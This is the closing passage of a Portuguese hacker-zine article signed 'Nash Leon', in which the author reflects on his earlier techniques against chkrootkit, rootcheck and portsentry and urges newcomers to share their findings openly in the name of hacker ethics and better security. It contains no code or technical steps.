+---------------------------
+
+Ao longo desse ano eu tenho demonstrado varios esquemas contra varias
+ferramentas de seguranca! Talvez nao existam textos descrevendo estes
+esquemas de maneira tao especificas, pelo menos eu nao conheco! Talvez
+eu tenha sido realmente o primeiro a escrever sobre esses esquemas,
+contra essas ferramentas, nao conheco nada descrito contra chkrootkit,
+contra rootckeck ou mesmo portsentry! Mas o que eu quero dizer eh que
+eu nao quero ser o unico! Ficaria muito contente se voce leitor, quem
+sabe num futuro breve, disponibilizasse um novo esquema contra essas
+ferramentas, ou mesmo, um esquema contra uma 'atualizacao' destas
+ferramentas, enfim.. Que algum dos irmaos que estao lendo isto aqui desse
+continuidade a isto tudo! Devemos deixar de lado esta ideia 'elitista'
+de que devemos manter 'segredo' das nossas descobertas ateh o tumulo!
+Nao existe isso na etica hacker e 'segurar' o conhecimento a sih mesmo,
+soh serve p/ provar a todos que voce nao eh um hacker!!! Um hacker de
+verdade compartilha, pois nao possue medo algum de que sua tecnica
+100% eficiente hoje amanha nao seja mais, pois ele sabe que eh capaz
+de amanha descobrir algo novo! As vezes uma tecnica que funciona em
+um determinado programa pode funcionar em outro, enfim, o que temos
+que ter em mente eh se realmente seremos 'corajosos' em tornar publico
+nossos conhecimentos visando 'aumentar a seguranca' dos sistemas!!!
+Sim, quanto mais seguros eles estiverem melhor p/ o usuario comum
+e mais esforco e conhecimento serah requerido dos fucadores eticos!!!
+Para quem de fato gosta de fucar, quanto maior o problema, melhor o
+cenario e a busca da solucao do problema proporciona uma maior satisfacao!
+
+Nao devemos temer que os esquemas que conhecemos hoje, amanha estejam
+ultrapassado, sempre haverah condicoes de 'exploitacao' quando de fato
+o 'executor' das tecnicas for um fucador nato! Seja voce desde jah um
+fucador nato, irmao NewBie!!!
+
+Um Abraco a Todos.
+
+						Nash Leon.
+
+
+-------------------------------- EOF ------------------------------------
+
+
